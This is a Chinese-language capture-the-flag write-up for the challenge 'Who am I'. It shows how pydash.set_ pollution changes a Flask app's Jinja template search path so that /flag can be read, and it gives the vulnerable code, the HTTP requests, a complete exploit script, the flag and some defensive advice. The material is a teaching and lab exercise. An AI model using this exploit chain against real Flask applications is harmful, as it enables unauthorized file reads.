# Who am I - Pydash 原型链污染 Writeup

## 题目信息
- 题目名称：Who am I
- 考点：Pydash 原型链污染 + Flask SSTI
- 难度：Medium

## 题目分析

### 代码审计

关键代码片段：

```python
from flask import Flask, request, render_template
import pydash

app = Flask(__name__)
database = {}
data_index = 0
name = ''
user = ""

@app.route('/operate', methods=['GET'])
def operate():
    username = request.args.get('username')
    password = request.args.get('password')
    confirm_password = request.args.get('confirm_password')
    if username in globals() and "old" not in password:
        Username = globals()[username]
        try:
            pydash.set_(Username, password, confirm_password)
            return "oprate success"
        except:
            return "oprate failed"
    else:
        return "oprate failed"

@app.route('/impression', methods=['GET'])
def impression():
    point = request.args.get('point')
    if len(point) > 5:
        return "Invalid request"
    List = ["{", "}", ".", "%", "<", ">", "_"]
    for i in point:
        if i in List:
            return "Invalid request"
    return render_template(point)
```

### 漏洞点识别

1. **`/operate` 路由 - Pydash 原型链污染**
   - 使用 `pydash.set_()` 函数设置对象属性
   - `username` 必须在 `globals()` 中（可用的有：`app`, `database`, `data_index`, `name`, `user`）
   - `password` 参数不能包含字符串 `"old"`
   - 可以通过嵌套路径修改对象的深层属性

2. **`/impression` 路由 - SSTI 潜在入口**
   - 直接调用 `render_template(point)` 渲染用户输入
   - 限制：长度 ≤ 5，不能包含 `{}.%<>_`
   - 如果能修改模板搜索路径，可以读取任意文件

## 漏洞利用

### 利用思路

通过 pydash 原型链污染修改 Flask 的模板搜索路径，然后利用 `render_template()` 读取 `/flag` 文件。

### 关键点

1. **Pydash.set_() 函数特性**
   ```python
   pydash.set_(obj, path, value)
   ```
   - 可以使用点号分隔的路径设置嵌套属性
   - 例如：`pydash.set_(app, 'config.DEBUG', True)` 相当于 `app.config['DEBUG'] = True`

2. **Flask 模板路径相关属性**
   - `app.root_path` - 应用根路径
   - `app.template_folder` - 模板文件夹（但包含 "old"，会被过滤）
   - `app.jinja_loader.searchpath` - Jinja2 模板加载器搜索路径

3. **绕过 "old" 过滤**
   - 不能直接修改 `template_folder`（包含 "old"）
   - 可以修改 `root_path` 或 `jinja_loader.searchpath`

### 利用步骤

#### 修改 jinja_loader.searchpath

**Step 1: 污染模板加载器路径**
```http
GET /operate?username=app&password=jinja_loader.searchpath&confirm_password=/ HTTP/1.1
Host: challenge.bluesharkinfo.com:25410
```

**Step 2: 读取 flag**
```http
GET /impression?point=flag HTTP/1.1
Host: challenge.bluesharkinfo.com:25410
```

## 利用脚本

```python
#!/usr/bin/env python3
import requests

base_url = "http://challenge.bluesharkinfo.com:25410"

# Step 1: 修改 jinja_loader.searchpath 为根目录
print("[+] Step 1: 污染 app.jinja_loader.searchpath")
resp = requests.get(
    f"{base_url}/operate",
    params={
        'username': 'app',
        'password': 'jinja_loader.searchpath',
        'confirm_password': '/'
    }
)
print(f"Result: {resp.text}")

# Step 2: 读取 flag
if "success" in resp.text:
    print("[+] Step 2: 读取 flag")
    resp = requests.get(
        f"{base_url}/impression",
        params={'point': 'flag'}
    )
    print(f"\nFLAG: {resp.text}")
```

## 常见错误

1. **使用了包含 "old" 的路径**
   ```
   ❌ template_folder (包含 "old")
   ✅ root_path
   ```

2. **username 不在 globals() 中**
   ```
   ✅ 可用的：app, database, data_index, name, user
   ```

## FLAG

```
ISCTF{c6182002-b3c3-49ae-bc37-cf5f40d53025}
```

## 知识点总结

1. **Pydash 原型链污染**
   - `pydash.set_()` 可以通过路径字符串修改对象的嵌套属性
   - 可以用来污染框架的全局配置

2. **Flask 模板系统**
   - `render_template()` 会在配置的路径下搜索模板文件
   - 可以通过修改 `root_path` 或 `jinja_loader.searchpath` 改变搜索路径

3. **安全防御建议**
   - 避免使用动态属性设置库（如 pydash.set_）处理用户输入
   - 对 `render_template()` 的参数进行严格白名单校验
   - 限制可以访问的全局变量

## 参考资料

- [Pydash 官方文档](https://pydash.readthedocs.io/)
- [Flask Jinja2 模板注入](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python)
- [原型链污染漏洞详解](https://portswigger.net/web-security/prototype-pollution)